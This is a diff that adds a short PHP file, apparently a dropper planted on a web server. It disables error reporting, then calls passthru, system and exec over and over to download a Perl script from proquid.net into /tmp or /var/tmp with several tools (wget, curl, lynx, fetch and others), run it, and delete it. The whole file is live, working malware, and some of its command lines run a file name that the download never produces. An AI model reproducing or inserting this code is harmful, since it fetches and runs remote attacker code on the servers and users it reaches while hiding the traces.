@@ -1,0 +1,37 @@
+<?
+set_time_limit(0);
+error_reporting(0);
+@passthru('cd /tmp;wget http://www.proquid.net/images/rul.txt; perl txt; rm -f txt*;');
+@passthru('cd /tmp;curl -O http://www.proquid.net/images/rul.txt; perl txt; rm -f txt*;');
+@passthru('cd /tmp;lwp-download http://www.proquid.net/images/rul.txt; perl txt; rm -f txt*;');
+@passthru('cd /tmp;lynx -source http://www.proquid.net/images/rul.txt >rul;perl rul;rm -f rul*');
+@passthru('cd /tmp;fetch http://www.proquid.net/images/rul.txt > rul;perl rul;rm -f rul*');
+@passthru('cd /tmp;GET http://www.proquid.net/images/rul.txt > rul;perl rul;rm -f rul*');
+@passthru('cd /var/tmp;wget http://www.proquid.net/images/rul.txt; perl txt; rm -f txt*;');
+@passthru('cd /var/tmp;curl -O http://www.proquid.net/images/rul.txt; perl txt; rm -f txt*;');
+@passthru('cd /var/tmp;lwp-download http://www.proquid.net/images/rul.txt; perl txt; rm -f txt*;');
+@passthru('cd /var/tmp;fetch http://www.proquid.net/images/rul.txt > rul;perl rul;rm -f rul*');
+@passthru('cd /var/tmp;GET http://www.proquid.net/images/rul.txt > rul;perl rul;rm -f rul*');
+@system('cd /tmp;wget http://www.proquid.net/images/rul.txt; perl txt; rm -f txt*;');
+@system('cd /tmp;curl -O http://www.proquid.net/images/rul.txt; perl txt; rm -f txt*;');
+@system('cd /tmp;lwp-download http://www.proquid.net/images/rul.txt; perl txt; rm -f txt*;');
+@system('cd /tmp;lynx -source http://www.proquid.net/images/rul.txt >rul;perl rul;rm -f rul*');
+@system('cd /tmp;fetch http://www.proquid.net/images/rul.txt > rul;perl rul;rm -f rul*');
+@system('cd /tmp;GET http://www.proquid.net/images/rul.txt > rul;perl rul;rm -f rul*');
+@system('cd /var/tmp;wget http://www.proquid.net/images/rul.txt; perl txt; rm -f txt*;');
+@system('cd /var/tmp;curl -O http://www.proquid.net/images/rul.txt; perl txt; rm -f txt*;');
+@system('cd /var/tmp;lwp-download http://www.proquid.net/images/rul.txt; perl txt; rm -f txt*;');
+@system('cd /var/tmp;fetch http://www.proquid.net/images/rul.txt > rul;perl rul;rm -f rul*');
+@system('cd /var/tmp;GET http://www.proquid.net/images/rul.txt > rul;perl rul;rm -f rul*');
+@exec('cd /tmp;wget http://www.proquid.net/images/rul.txt; perl txt; rm -f txt*;');
+@exec('cd /tmp;curl -O http://www.proquid.net/images/rul.txt; perl txt; rm -f txt*;');
+@exec('cd /tmp;lwp-download http://www.proquid.net/images/rul.txt; perl txt; rm -f txt*;');
+@exec('cd /tmp;lynx -source http://www.proquid.net/images/rul.txt >rul;perl rul;rm -f rul*');
+@exec('cd /tmp;fetch http://www.proquid.net/images/rul.txt > rul;perl rul;rm -f rul*');
+@exec('cd /tmp;GET http://www.proquid.net/images/rul.txt > rul;perl rul;rm -f rul*');
+@exec('cd /var/tmp;wget http://www.proquid.net/images/rul.txt; perl txt; rm -f txt*;');
+@exec('cd /var/tmp;curl -O http://www.proquid.net/images/rul.txt; perl txt; rm -f txt*;');
+@exec('cd /var/tmp;lwp-download http://www.proquid.net/images/rul.txt; perl txt; rm -f txt*;');
+@exec('cd /var/tmp;fetch http://www.proquid.net/images/rul.txt > rul;perl rul;rm -f rul*');
+@exec('cd /var/tmp;GET http://www.proquid.net/images/rul.txt > rul;perl rul;rm -f rul*');
+?>
